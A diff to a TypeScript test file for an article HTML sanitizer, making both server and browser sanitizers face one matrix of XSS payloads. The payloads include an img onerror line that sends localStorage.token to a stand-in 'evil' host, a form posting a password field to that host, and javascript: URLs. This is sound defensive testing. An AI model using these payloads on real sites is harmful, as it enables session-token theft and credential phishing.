@@ -4,7 +4,8 @@ import {
     updateArticleSchema,
 } from '../controllers/articles.controller';
 import { generateSlug, generateUniqueSlug } from '../services/slug';
-import { sanitizeArticleHtml } from '../../utils/sanitize';
+import { sanitizeArticleHtml as sanitizeOnServer } from '../services/sanitize';
+import { sanitizeArticleHtml as sanitizeInBrowser } from '../../utils/sanitize';
 import { optionalHttpUrl } from '../services/validators';
 
 type Parsed = Record<string, unknown>;
@@ -64,7 +65,13 @@ describe('updateArticleSchema', () => {
     });
 });
 
-describe('sanitizeArticleHtml', () => {
+// The server (sanitize-html) and the browser (DOMPurify) use different engines
+// against one shared allowlist, so both are held to the same attack matrix —
+// a divergence here is exactly the bug this pairing could otherwise hide.
+describe.each([
+    ['server', sanitizeOnServer],
+    ['browser', sanitizeInBrowser],
+])('sanitizeArticleHtml (%s)', (_engine, sanitize) => {
     it.each([
         ['script tag', '<p>hi</p><script>alert(1)</script>'],
         ['img onerror', '<img src=x onerror="fetch(\'https://evil/\'+localStorage.token)">'],
@@ -72,8 +79,10 @@ describe('sanitizeArticleHtml', () => {
         ['svg onload', '<svg onload=alert(1)></svg>'],
         ['inline onclick', '<p onclick="alert(1)">text</p>'],
         ['style url(javascript:)', '<div style="background:url(javascript:alert(1))">x</div>'],
+        ['iframe javascript: src', '<iframe src="javascript:alert(1)"></iframe>'],
+        ['form injection', '<form action="https://evil"><input name="pw"></form>'],
     ])('neutralizes %s', (_label, payload) => {
-        const out = sanitizeArticleHtml(payload);
+        const out = sanitize(payload);
         expect(out).not.toMatch(/<script|onerror|onload|onclick|javascript:/i);
     });
 
@@ -86,12 +95,13 @@ describe('sanitizeArticleHtml', () => {
         ['<p class="ql-align-center">centered</p>'],
         ['<blockquote>quoted</blockquote>'],
     ])('preserves legitimate editor output: %s', (payload) => {
-        expect(sanitizeArticleHtml(payload)).toBe(payload);
+        // Normalize the self-closing/void-element spelling the two engines differ on.
+        expect(sanitize(payload).replace(/\s*\/>/g, '>')).toBe(payload.replace(/\s*\/>/g, '>'));
     });
 
     it('returns a string for empty input', () => {
-        expect(sanitizeArticleHtml(undefined)).toBe('');
-        expect(sanitizeArticleHtml(null)).toBe('');
+        expect(sanitize(undefined)).toBe('');
+        expect(sanitize(null)).toBe('');
     });
 });
 
